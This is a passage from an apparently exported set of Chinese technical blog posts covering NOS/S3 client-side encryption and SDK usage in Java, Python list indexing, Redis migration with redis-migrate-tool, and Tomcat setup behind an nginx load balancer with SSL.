throws IOException, InvalidKeySpecException, NoSuchAlgorithmException { KeyGenerator symKeyGenerator = null; try { symKeyGenerator = KeyGenerator.getInstance(&quot;AES&quot;); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } symKeyGenerator.init(256); return symKeyGenerator.generateKey(); } // 保存Key，该key只要生成一次就好了，要妥善保管，如果该key丢失了，那么意味着通过该key加密的数据将没法解密 // 非对称 public static void saveKeyPair(String dir, KeyPair keyPair) throws IOException { PrivateKey privateKey = keyPair.getPrivate(); PublicKey publicKey = keyPair.getPublic(); X509EncodedKeySpec x509EncodedKeySpec = new X509EncodedKeySpec(publicKey.getEncoded()); FileOutputStream fos = new FileOutputStream(dir + &quot;/public.key&quot;); fos.write(x509EncodedKeySpec.getEncoded()); fos.close(); PKCS8EncodedKeySpec pkcs8EncodedKeySpec = new PKCS8EncodedKeySpec(privateKey.getEncoded()); fos = new FileOutputStream(dir + &quot;/private.key&quot;); fos.write(pkcs8EncodedKeySpec.getEncoded()); fos.close(); } // 对称 public static void saveSymmetricKey(String path, SecretKey secretKey) throws IOException { X509EncodedKeySpec x509EncodedKeySpec = new X509EncodedKeySpec(secretKey.getEncoded()); FileOutputStream keyfos = new FileOutputStream(path); keyfos.write(x509EncodedKeySpec.getEncoded()); keyfos.close(); } public static void main(String[] args) throws NoSuchAlgorithmException { String accessKey = &quot;&quot;; String secretKey = &quot;&quot;; String bucketName = &quot;cloud201411&quot;; // 1.生成RSA 密钥对 // try { // saveKeyPair(&quot;/Users/wenjun/Downloads/rsa&quot;, genKeyPair(&quot;RSA&quot;, 1024)); // // } catch (IOException e) { // // TODO Auto-generated catch block // e.printStackTrace(); // } // 2.加载 RSA 文件 String keyDir = &quot;/Users/wenjun/Downloads/rsa&quot;; // 1.获取CMK，客户端主密钥，可以使用对称和分对称两种方式，下述使用的是非对称的 KeyPair keyPair = null; try { keyPair = loadKeyPairRSA(keyDir, &quot;RSA&quot;); } catch (InvalidKeySpecException e) { // TODO Auto-generated catch block e.printStackTrace(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } // 2. Construct an instance of AmazonS3Encryption. EncryptionMaterials encryptionMaterials = new EncryptionMaterials(keyPair); ClientConfiguration configuration = new ClientConfiguration(); configuration.setProtocol(Protocol.HTTPS); CryptoConfiguration cryptoConfiguration = new CryptoConfiguration(); // 支持EncryptionOnly，AuthenticatedEncryption,StrictAuthenticatedEncryption,默认是EncryptionOnly，StrictAuthenticatedEncryption不支持range请求 cryptoConfiguration.setCryptoMode(CryptoMode.StrictAuthenticatedEncryption); // 保存加密信息的方式，有两种方式，Instruction模式和Metadata模式，由于NOS分块上传和S3支持上存在一些差异，导致metadata保存的方式大文件下载时由于找不到加密信息而不解密 cryptoConfiguration.setStorageMode(CryptoStorageMode.InstructionFile); EncryptionMaterialsProvider encryptionMaterialsProvider = new StaticEncryptionMaterialsProvider( encryptionMaterials); ClientConfiguration clientConfiguration = new ClientConfiguration(); clientConfiguration.setProtocol(Protocol.HTTPS); AwsClientBuilder.EndpointConfiguration endpointConfiguration = new AwsClientBuilder.EndpointConfiguration( &quot;nos-eastchina1.126.net&quot;, &quot;us-east-1&quot;); AmazonS3Encryption encryptionClient = AmazonS3EncryptionClientBuilder.standard() .withCryptoConfiguration(cryptoConfiguration) .withCredentials(new AWSStaticCredentialsProvider(new BasicAWSCredentials(accessKey, secretKey))) .withEncryptionMaterials(encryptionMaterialsProvider).withClientConfiguration(clientConfiguration) .withEndpointConfiguration(endpointConfiguration).build(); //要上传文件的路径 String filePath = &quot;tomcat.zip&quot;; try { encryptionClient.putObject(bucketName,&quot;tomcat11111.zip&quot;, new File(filePath)); }catch (Exception e){ System.out.println(e.getMessage()); } } }加密后看到存储有2个文件 一个是 tomcat.zip.instruction，一个是 tomcat.zip tomcat.zip.instruction 记录着加密文件的元信息 {&quot;x-amz-tag-len&quot;:&quot;128&quot;,&quot;x-amz-iv&quot;:&quot;glBQ2qlgTn+8tJkG&quot;,&quot;x-amz-wrap-alg&quot;:&quot;RSA/ECB/OAEPWithSHA-256AndMGF1Padding&quot;,&quot;x-amz-key-v2&quot;:&quot;G/ZrpexIpCaRBHNaU/mBTzAVY61Dm8OlQbvV4EJea2+o4mFcZn2FZ6KXVUb3/qzaYlcol6+nc9gum9J+pNZW1x2tG5RoPJ8e743IOJ9GD7zO5evpUzvk658w4iWbLuaCxTayzha/7VDIBwRiVGClseytCJ2WusadSmFHaIRike4=&quot;,&quot;x-amz-cek-alg&quot;:&quot;AES/GCM/NoPadding&quot;,&quot;x-amz-matdesc&quot;:&quot;{}&quot;}AES 的加密方式请查看这里","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"AWS S3 JAVA SDK","slug":"AWS-S3-JAVA-SDK","date":"2018-04-09T10:32:19.000Z","updated":"2021-02-26T06:05:29.239Z","comments":true,"path":"posts/27545.html","link":"","permalink":"https://awen.me/posts/27545.html","excerpt":"本文代码为网易云 AWS S3 JAVA SDK 代码,为什么要写到这里，因为开发给的文档有问题，代码也有问题，无奈自己调试。","text":"本文代码为网易云 AWS S3 JAVA SDK 代码,为什么要写到这里，因为开发给的文档有问题，代码也有问题，无奈自己调试。 初始化/** * 初始化 */ String accessKey = &quot;&quot;; String secretKey = &quot;&quot;; AWSCredentials credentials = new BasicAWSCredentials(accessKey,secretKey); ClientConfiguration conf = new ClientConfiguration(); // 设置AmazonS3使用的最大连接数 conf.setMaxConnections(200); // 设置socket超时时间 conf.setSocketTimeout(10000); // 设置失败请求重试次数 conf.setMaxErrorRetry(2); // 如果要用https协议，请加上下面语句 conf.setProtocol(Protocol.HTTPS); //AmazonS3 s3Client = new AmazonS3Client(credentials,clientConfiguration); //s3Client.setEndpoint(endPoint); AmazonS3 s3Client = AmazonS3ClientBuilder.standard() .withCredentials(new AWSStaticCredentialsProvider(credentials)) .withEndpointConfiguration(new AwsClientBuilder.EndpointConfiguration(&quot;nos-eastchina1.126.net&quot;,&quot;us-east-1&quot;)) .withClientConfiguration(conf) .build();//endpoint,region请指定为NOS支持的创建桶 /** * 创建桶 */ String bucketName = &quot;cloud201411&quot;; boolean exists = s3Client.doesBucketExist(bucketName); if (exists) { System.out.println(&quot;桶已存在&quot;); }else { CreateBucketRequest request = new CreateBucketRequest(bucketName); request.setCannedAcl(CannedAccessControlList.PublicRead); s3Client.createBucket(request); } /** * 列举桶 */ for (Bucket bucket : s3Client.listBuckets()) { System.out.println(&quot; - &quot; + bucket.getName()); } /** * 删除桶 */ // s3Client.deleteBucket(bucketName); // for (Bucket bucket : s3Client.listBuckets()) { // System.out.println(&quot; - &quot; + bucket.getName()); // } /** * 查看桶的 ACL */ AccessControlList accessControlList = s3Client.getBucketAcl(bucketName); System.out.println(&quot;owner : &quot; + accessControlList.getOwner().getId() + &quot; : &quot; + accessControlList.getOwner().getDisplayName()); for(Grant grant : accessControlList.getGrantsAsList()){//NOS由于权限不能赋值给其他的用户，所以返回值中只有一条记录 System.out.println(grant.getGrantee().getIdentifier() + &quot; : &quot; + grant.getPermission() + &quot; : &quot; + grant.getGrantee().getTypeIdentifier()); }上传文件 /** * 上传内容 */ //要上传文件的路径 // String content = &quot;Object content&quot;; // try { // s3Client.putObject(bucketName,&quot;a/b/test.txt&quot;,content); // }catch (Exception e){ // System.out.println(e.getMessage()); // } /** * 上传普通文件 */ //要上传文件的路径 // String filePath = &quot;tomcat.zip&quot;; // try { // s3Client.putObject(bucketName,&quot;tomcat.zip&quot;, new File(filePath)); // }catch (Exception e){ // System.out.println(e.getMessage()); // } /** * 设置元数据 * */ // String filePath = &quot;tomcat.zip&quot;; // ObjectMetadata objectMetadata = new ObjectMetadata(); // //设置Content-Type // objectMetadata.setContentType(&quot;application/zip&quot;); // //设置标准http消息头（元数据） // objectMetadata.setHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;); // //设置用户自定义元数据信息 // Map&lt;String, String&gt; userMeta = new HashMap&lt;String, String&gt;(); // userMeta.put(&quot;ud&quot;, &quot;test&quot;); // objectMetadata.setUserMetadata(userMeta); // PutObjectRequest putObjectRequest = new PutObjectRequest(bucketName,&quot;tomcat1.zip&quot;, new File(filePath)); // putObjectRequest.setMetadata(objectMetadata); // s3Client.putObject(putObjectRequest); // // try { // ObjectMetadata objectMetadata = new ObjectMetadata(); // //设置流的长度，您还可以设置其他文件元数据信息 // objectMetadata.setContentLength(streamLength); // s3Client.putObject(&quot;your-bucketname&quot;,&quot;your-objectname&quot;, inputStream, objectMetadata) // }catch (Exception e){ // System.out.println(e.getMessage()); // } }分块上传package awsnos.awsnos; import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.util.ArrayList; import java.util.List; import com.amazonaws.ClientConfiguration; import com.amazonaws.Protocol; import com.amazonaws.auth.AWSCredentials; import com.amazonaws.auth.AWSStaticCredentialsProvider; import com.amazonaws.auth.BasicAWSCredentials; import com.amazonaws.client.builder.AwsClientBuilder; import com.amazonaws.services.s3.AmazonS3; import com.amazonaws.services.s3.AmazonS3ClientBuilder; import com.amazonaws.services.s3.model.CompleteMultipartUploadRequest; import com.amazonaws.services.s3.model.CompleteMultipartUploadResult; import com.amazonaws.services.s3.model.InitiateMultipartUploadRequest; import com.amazonaws.services.s3.model.InitiateMultipartUploadResult; import com.amazonaws.services.s3.model.ListPartsRequest; import com.amazonaws.services.s3.model.ObjectMetadata; import com.amazonaws.services.s3.model.PartETag; import com.amazonaws.services.s3.model.UploadPartRequest; public class AwsS3 { public static void main(String[] args) { /** * 初始化 */ String accessKey = &quot;&quot;; String secretKey = &quot;&quot;; AWSCredentials credentials = new BasicAWSCredentials(accessKey,secretKey); ClientConfiguration conf = new ClientConfiguration(); // 设置AmazonS3使用的最大连接数 conf.setMaxConnections(200); // 设置socket超时时间 conf.setSocketTimeout(10000); // 设置失败请求重试次数 conf.setMaxErrorRetry(2); // 如果要用https协议，请加上下面语句 conf.setProtocol(Protocol.HTTPS); AmazonS3 s3Client = AmazonS3ClientBuilder.standard() .withCredentials(new AWSStaticCredentialsProvider(credentials)) .withEndpointConfiguration(new AwsClientBuilder.EndpointConfiguration(&quot;nos-eastchina1.126.net&quot;,&quot;us-east-1&quot;)) .withClientConfiguration(conf) .build(); String bucketName = &quot;cloud201411&quot;; String key = &quot;tomcat111.zip&quot;; //对象名称 String filePath = &quot;tomcat.zip&quot;; // 文件路径 File file = new File(filePath); long contentLength = file.length(); long partSize = 5 * 1024 * 1024; // Set part size to 5 MB. List&lt;PartETag&gt; partETags = new ArrayList&lt;&gt;(); try { FileInputStream is = new FileInputStream(file); } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } InitiateMultipartUploadRequest initRequest = new InitiateMultipartUploadRequest(bucketName,key); //您还可以在初始化分块上传时，设置文件的Content-Type ObjectMetadata objectMetadata = new ObjectMetadata(); objectMetadata.setContentType(&quot;application/zip&quot;); initRequest.setObjectMetadata(objectMetadata); InitiateMultipartUploadResult initResult = s3Client.initiateMultipartUpload(initRequest); String uploadId = initResult.getUploadId(); /** * 上传文件 */ long filePosition = 0; for (int i = 1; filePosition &lt; contentLength; i++) { // Last part can be less than 5 MB. Adjust part size. partSize = Math.min(partSize, (contentLength - filePosition)); System.out.println(&quot;partNum : &quot; + i + &quot; , partSize : &quot; + partSize); // Create request to upload a part. UploadPartRequest uploadRequest = new UploadPartRequest() .withBucketName(bucketName).withKey(key) .withUploadId(uploadId).withPartNumber(i) .withFileOffset(filePosition) .withFile(file) //要上传的文件对象 .withPartSize(partSize); partETags.add(s3Client.uploadPart(uploadRequest).getPartETag()); filePosition += partSize; } /** * 完成上传 */ CompleteMultipartUploadRequest completeRequest = new CompleteMultipartUploadRequest( bucketName,key, uploadId, partETags); CompleteMultipartUploadResult completeResult = s3Client.completeMultipartUpload(completeRequest); } }操作 AWS S3看了下 aws s3 的开发文档，发现这个代码完全平移过去改下 ak，sk 和 origin 以endpoint 就可以操作 aws 的对象存储,或者说这个 SDK 就是亚马逊提供的，只不过网易云兼容了 aws 的接口。 package awsnos.awsnos; import java.security.NoSuchAlgorithmException; import com.amazonaws.ClientConfiguration; import com.amazonaws.Protocol; import com.amazonaws.auth.AWSCredentials; import com.amazonaws.auth.AWSStaticCredentialsProvider; import com.amazonaws.auth.BasicAWSCredentials; import com.amazonaws.client.builder.AwsClientBuilder; import com.amazonaws.services.s3.AmazonS3; import com.amazonaws.services.s3.AmazonS3ClientBuilder; import com.amazonaws.services.s3.AmazonS3Encryption; import com.amazonaws.services.s3.AmazonS3EncryptionClientBuilder; import com.amazonaws.services.s3.model.Bucket; import com.amazonaws.services.s3.model.CannedAccessControlList; import com.amazonaws.services.s3.model.CreateBucketRequest; import com.amazonaws.services.s3.model.CryptoConfiguration; import com.amazonaws.services.s3.model.CryptoMode; import com.amazonaws.services.s3.model.CryptoStorageMode; import com.amazonaws.services.s3.model.EncryptionMaterials; import com.amazonaws.services.s3.model.EncryptionMaterialsProvider; import com.amazonaws.services.s3.model.StaticEncryptionMaterialsProvider; public class Aws3 { public static void main(String[] args) throws NoSuchAlgorithmException { String accessKey = &quot;AKIA*****TGD3B***MDA&quot;; String secretKey = &quot;GL*******ZFfH5H***gVb/yUO4YA***iBUy8X6U&quot;; String bucketName = &quot;cloud201411&quot;; AWSCredentials credentials = new BasicAWSCredentials(accessKey, secretKey); ClientConfiguration conf = new ClientConfiguration(); // 设置AmazonS3使用的最大连接数 conf.setMaxConnections(200); // 设置socket超时时间 conf.setSocketTimeout(10000); // 设置失败请求重试次数 conf.setMaxErrorRetry(2); // 如果要用https协议，请加上下面语句 conf.setProtocol(Protocol.HTTPS); // AmazonS3 s3Client = new AmazonS3Client(credentials,clientConfiguration); // s3Client.setEndpoint(endPoint); AmazonS3 s3Client = AmazonS3ClientBuilder.standard() .withCredentials(new AWSStaticCredentialsProvider(credentials)) .withEndpointConfiguration( new AwsClientBuilder.EndpointConfiguration(&quot;s3.ap-northeast-1.amazonaws.com&quot;, &quot;ap-northeast-1&quot;)) .withClientConfiguration(conf).build();// endpoint,region请指定为NOS支持的 /** * 创建桶 */ boolean exists = s3Client.doesBucketExist(bucketName); if (exists) { System.out.println(&quot;桶已存在&quot;); } else { CreateBucketRequest request = new CreateBucketRequest(bucketName); request.setCannedAcl(CannedAccessControlList.PublicRead); s3Client.createBucket(request); } /** * 列举桶 */ for (Bucket bucket : s3Client.listBuckets()) { System.out.println(&quot; - &quot; + bucket.getName()); } } } AWS S3的 endpoint 以及 origin 参考AWS文档","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"python 循环获取索引","slug":"python-循环获取索引","date":"2018-04-09T06:39:03.000Z","updated":"2021-02-26T06:05:29.284Z","comments":true,"path":"posts/25702.html","link":"","permalink":"https://awen.me/posts/25702.html","excerpt":"","text":"最好的选择就是用内建函数enumerate for idx, val in enumerate(ints): print idx, val例如 json_data = response.json() for idx, val in enumerate(json_data[&apos;tickets&apos;]): print(&apos;|&apos;+val[&apos;id&apos;]+&apos;|&apos;+val[&apos;requester_name&apos;]+&apos;|&apos;+val[&apos;title&apos;]+&apos;|&apos;)不过后来发现这个方法不太符合我们的需求，如果要返回值，比如有一组数据 {&apos;tickets&apos;: [{&apos;id&apos;: &apos;28375&apos;,……}，{‘id’:&apos;22222&apos;},{&apos;id&apos;:&apos;2222333&apos;}]}希望获取ticket 中的所有 id response = response.json() result_id = [(d[&apos;id&apos;]) for d in response[&apos;tickets&apos;]]","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"redis 迁移数据","slug":"redis-迁移数据","date":"2018-04-04T13:04:26.000Z","updated":"2021-02-26T06:05:29.290Z","comments":true,"path":"posts/16843.html","link":"","permalink":"https://awen.me/posts/16843.html","excerpt":"某用户之前买了个16G 的单实例 redis，但是由于其只是存放一些简单的 session 数据，所以用不到这么大，因此希望把数据迁移到一个规格比较小的实例，本文就演示下如何做迁移","text":"某用户之前买了个16G 的单实例 redis，但是由于其只是存放一些简单的 session 数据，所以用不到这么大，因此希望把数据迁移到一个规格比较小的实例，本文就演示下如何做迁移 模拟环境A 库: 10.173.32.111 port 6379B 库：10.173.32.114 port 6379 说明 1.环境必须在 linux 下编译安装，mac 我测试一直提示密码错误，参考 issue 模拟写入数据到 A 库[root@centos ~]# redis-cli -h 10.173.32.111 10.173.32.111:6379&gt; auth xxxx OK 10.173.32.111:6379&gt; set foo bar OK 10.173.32.111:6379&gt; get foo &quot;bar&quot; 10.173.32.111:6379&gt; redis-migrate-tool特点 快速。 多线程。 基于redis复制。 实时迁移。 迁移过程中，源集群不影响对外提供服务。 异构迁移。 支持Twemproxy集群，redis cluster集群，rdb文件 和 aof文件。 过滤功能。 当目标集群是Twemproxy，数据会跳过Twemproxy直接导入到后端的redis。 迁移状态显示。 完善的数据抽样校验。 迁移工具的来源可以是：单独的redis实例，twemproxy集群，redis cluster，rdb文件，aof文件。 迁移工具的目标可以是：单独的redis实例，twemproxy集群，redis cluster，rdb文件。 地址:https://github.com/vipshop/redis-migrate-tool centos 先把开发包安装上 yum group install &quot;Development Tools&quot;编译 $ cd redis-migrate-tool $ autoreconf -fvi $ ./configure $ make $ src/redis-migrate-tool -h执行 src/redis-migrate-tool -c ~/Downloads/rmt.conf -o log -drmt.conf [source] type: single servers: - 10.173.32.111:6379 redis_auth: xxxx [target] type: single servers: - 10.173.32.114:6379 redis_auth: xxxx [common] listen: 0.0.0.0:8888 连接到B 库去查看下是否有数据 [root@centos redis-migrate-tool]# redis-cli -h 10.173.32.114 10.173.32.114:6379&gt; auth xxxx OK 10.173.32.114:6379&gt; get foo &quot;bar&quot; 10.173.32.114:6379&gt;出现异常可以看下日志 [root@centos redis-migrate-tool]# cat log.log [2018-04-10 13:34:24.331] rmt_core.c:525 Nodes count of source group : 1 [2018-04-10 13:34:24.332] rmt_core.c:526 Total threads count : 2 [2018-04-10 13:34:24.332] rmt_core.c:527 Read threads count assigned: 1 [2018-04-10 13:34:24.332] rmt_core.c:528 Write threads count assigned: 1 [2018-04-10 13:34:24.332] rmt_core.c:836 instances_by_host: [2018-04-10 13:34:24.332] rmt_core.c:840 10.173.32.111:6379 [2018-04-10 13:34:24.332] rmt_core.c:842 [2018-04-10 13:34:24.332] rmt_core.c:2444 Total threads count in fact: 2 [2018-04-10 13:34:24.332] rmt_core.c:2445 Read threads count in fact: 1 [2018-04-10 13:34:24.332] rmt_core.c:2446 Write threads count in fact: 1 [2018-04-10 13:34:24.332] rmt_core.c:2455 read thread(0): [2018-04-10 13:34:24.332] rmt_core.c:2461 10.173.32.111:6379 [2018-04-10 13:34:24.332] rmt_core.c:2488 write thread(0): [2018-04-10 13:34:24.332] rmt_core.c:2494 10.173.32.111:6379 [2018-04-10 13:34:24.333] rmt_core.c:2551 migrate job is running... [2018-04-10 13:34:24.335] rmt_redis.c:1706 Start connecting to MASTER[10.173.32.111:6379]. [2018-04-10 13:34:24.335] rmt_redis.c:1740 Master[10.173.32.111:6379] replied to PING, replication can continue... [2018-04-10 13:34:24.335] rmt_redis.c:1051 Partial resynchronization for MASTER[10.173.32.111:6379] not possible (no cached master). [2018-04-10 13:34:24.336] rmt_redis.c:1110 Full resync from MASTER[10.173.32.111:6379]: d48a2a3890d782e5f4a34f9d0d463fded99770dc:141768 [2018-04-10 13:34:24.378] rmt_redis.c:1517 MASTER &lt;-&gt; SLAVE sync: receiving 29 bytes from master[10.173.32.111:6379] [2018-04-10 13:34:24.378] rmt_redis.c:1623 MASTER &lt;-&gt; SLAVE sync: RDB data for node[10.173.32.111:6379] is received, used: 0 s [2018-04-10 13:34:24.379] rmt_redis.c:1643 rdb file node10.173.32.111:6379-1523338464336559-33353.rdb write complete [2018-04-10 13:34:24.379] rmt_redis.c:6601 Rdb file for node[10.173.32.111:6379] parsed finished, use: 0 s. [2018-04-10 13:34:24.379] rmt_redis.c:6709 All nodes&apos; rdb file parsed finished for this write thread(0).查看复制进度 ➜ ~ redis-cli -h 127.0.0.1 -p 8888 info # Server version:0.1.0 os:Darwin 17.5.0 x86_64 multiplexing_api:kqueue gcc_version:4.2.1 process_id:9546 tcp_port:8888 uptime_in_seconds:214 uptime_in_days:0 config_file:/Users/wenjun/Downloads/rmt.conf # Clients connected_clients:1 max_clients_limit:100 total_connections_received:2 # Memory mem_allocator:jemalloc-0.0.0 # Group source_nodes_count:1 target_nodes_count:1 # Stats all_rdb_received:1 all_rdb_parsed:0 all_aof_loaded:0 rdb_received_count:1 rdb_parsed_count:0 aof_loaded_count:0 total_msgs_recv:0 total_msgs_sent:0 total_net_input_bytes:383 total_net_output_bytes:0 total_net_input_bytes_human:383B total_net_output_bytes_human:0B total_mbufs_inqueue:21 total_msgs_outqueue:0info命令响应指令： 服务器： 版本：redis-migrate-tool版本号。 操作系统：操作系统uname。 multiplexing_api：复用API。 gcc_version：Gcc版本。 process_id：redis-migrate-tool的进程ID。 tcp_port：tcp端口redis-migrate-tool监听。 uptime_in_seconds：秒运行redis-migrate-tool。 uptime_in_days：运行redis-migrate- tools的日子。 config_file：redis-migrate-tool的配置文件名。 客户： connected_clients：目前连接的客户端的数量。 max_clients_limit：允许同时接受的最大客户数量。 total_connections_received：到目前为止收到的连接总数。组： source_nodes_count：源redis组的节点数。 target_nodes_count：目标redis组的节点数。统计： all_rdb_received：是否收到源组中所有节点的rdb。 all_rdb_parsed：源组中已解析的节点的所有rdb是否完成。 all_aof_loaded：源组中的节点的所有aof文件是否已加载完成。 rdb_received_count：源组中节点的接收rdb计数。 rdb_parsed_count：源组中节点的解析完成rdb数量。 aof_loaded_count：加载完成的源组中节点的aof文件数量。 total_msgs_recv：从源组收到的消息总数。 total_msgs_sent：已发送到目标组并收到目标组响应的消息总数。 total_net_input_bytes：从源组收到的输入字节总数。 total_net_output_bytes：已发送到目标组的输出字节总数。 total_net_input_bytes_human：同total_net_input_bytes，但转换为人类可读的。 total_net_output_bytes_human：同total_net_output_bytes，但转换为人类可读的。 total_mbufs_inqueue：通过mbufs从源组输入缓存的命令数据（不包括rdb数据）。 total_msgs_outqueue：消息将被发送到目标组，消息已发送到目标，但正在等待响应。 停止 ➜ ~ redis-cli -h 127.0.0.1 -p 8888 127.0.0.1:8888&gt; shutdown OK (10.00s) 127.0.0.1:8888&gt;","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"Tomcat 安装配置与优化","slug":"Tomcat配置与优化","date":"2018-04-04T05:48:21.000Z","updated":"2021-02-26T06:05:29.267Z","comments":true,"path":"posts/49073.html","link":"","permalink":"https://awen.me/posts/49073.html","excerpt":"什么是 TomcatTomcat 是 Java web 服务器中使用最广的中间件，jsp 必须要使用类似 Tomcat 这样的程序进行解析。 Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。 Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应对HTML 页面的访问请求。实际上Tomcat 部分是Apache 服务器的扩展，但它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。","text":"什么是 TomcatTomcat 是 Java web 服务器中使用最广的中间件，jsp 必须要使用类似 Tomcat 这样的程序进行解析。 Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。 Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应对HTML 页面的访问请求。实际上Tomcat 部分是Apache 服务器的扩展，但它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 安装 Java1.下载 wget -c http://file201503.oss-cn-shanghai.aliyuncs.com/ftp/jdk-8u151-linux-x64.tar.gz2.解压后放到/usr/local/下 mv jdk1.8.0_151/ /usr/local/jdk18 3.配置环境变量 vim /etc/profile 输入 export JAVA_HOME=/usr/local/jdk18 export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 保存后执行 source /etc/profile 安装 Tomcat1.打开官网下载 wget -c http://supergsego.com/apache/tomcat/tomcat-8/v8.5.29/bin/apache-tomcat-8.5.29.tar.gz解压后复制3份分别为 Tomcat1 Tomcat2 Tomcat3 [root@centos ~]# cd /usr/local/tomcat tomcat1/ tomcat2/ tomcat3/分别修改3个目录下 conf 下的 server.xml 端口为 8080、8081、8082 &lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;启动 3 个 Tomcat [root@centos bin]# ./catalina.sh start Using CATALINA_BASE: /usr/local/tomcat1 Using CATALINA_HOME: /usr/local/tomcat1 Using CATALINA_TMPDIR: /usr/local/tomcat1/temp Using JRE_HOME: /usr/local/jdk18 Using CLASSPATH: /usr/local/tomcat1/bin/bootstrap.jar:/usr/local/tomcat1/bin/tomcat-juli.jar Tomcat started.Tomcat 目录说明： bin：二进制执行文件。里面最常用的文件是startup.bat，如果是 Linux 或 Mac 系统启动文件为 startup.sh。conf:配置目录。里面最核心的文件是server.xml。可以在里面改端口号等。默认端口号是8080，也就是说，此端口号不能被其他应用程序占用。lib：库文件。tomcat运行时需要的jar包所在的目录logs：日志temp：临时产生的文件，即缓存webapps：web的应用程序。web应用放置到此目录下浏览器可以直接访问work：编译以后的class文件。 Tomcat 自身配置域名和80端口访问如果要使用80端口访问域名则配置 &lt;Connector port=&quot;80&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; …… &lt;Host name=&quot;www.v5linux.com&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;!-- SingleSignOn valve, share authentication between web applications Documentation at: /docs/config/valve.html --&gt; &lt;!-- &lt;Valve className=&quot;org.apache.catalina.authenticator.SingleSignOn&quot; /&gt; --&gt; &lt;!-- Access log processes all example. Documentation at: /docs/config/valve.html Note: The pattern used is equivalent to using pattern=&quot;common&quot; --&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;Context docBase=&quot;/data/&quot; path=&quot;&quot; debug=&quot;0&quot; reloadable=&quot;true&quot;/&gt; &lt;/Host&gt;配置 nginx 代理多Tomcat 访问在 nginx http 段加入 http { upstream tomcatcluster { ip_hash; server 127.0.0.1:8080; server 127.0.0.1:8081; server 127.0.0.1:8082; } ……在 server 段配置，这里我配置了80端口跳443，并且加了 ssl 证书 server { listen 80; server_name _; server_name www.v5linux.com v5linux.com; if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } rewrite ^(.*)$ https://www.v5linux.com$1 permanent; } server { listen 443; server_name www.v5linux.com; ssl on; ssl_certificate //usr/local/nginx/ssl/v5linux/fullchain.cer; ssl_certificate_key /usr/local/nginx/ssl/v5linux/v5linux.key; ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_protocols TLSv1.2; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets on; resolver 114.114.114.114 valid=300s; resolver_timeout 10s; access_log logs/host.access.log main; location / { root html; index index.html index.htm; proxy_pass http://tomcatcluster; } }开放防火墙 iptables -A INPUT -p tcp --dport 443 -j ACCEPT做好解析，并确认 # dig www.v5linux.com ; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.v5linux.com ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 62933 ;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;www.v5linux.com. IN A ;; ANSWER SECTION: www.v5linux.com. 0 IN A 59.111.92.121 ;; Query time: 12 msec ;; SERVER: 127.0.0.1#53(127.0.0.1) ;; WHEN: Wed Apr 04 14:00:14 CST 2018 ;; MSG SIZE rcvd: 49浏览器访问 发现没有问题 Tomcat 自身配 ssl 证书，可以在 server.xml 中这段进行配置 &lt;Connector port=&quot;8443&quot; protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; maxThreads=&quot;150&quot; SSLEnabled=&quot;true&quot;&gt; &lt;SSLHostConfig&gt; &lt;Certificate certificateKeystoreFile=&quot;conf/localhost-rsa.jks&quot; type=&quot;RSA&quot; /&gt; &lt;/SSLHostConfig&gt; &lt;/Connector&gt;Tomcat 默认的路径是在 Tomcat 的目录下的 webapps ，可以在配置文件中修改 &lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;我们将其修改为 &lt;Context docBase=&quot;/data/&quot; 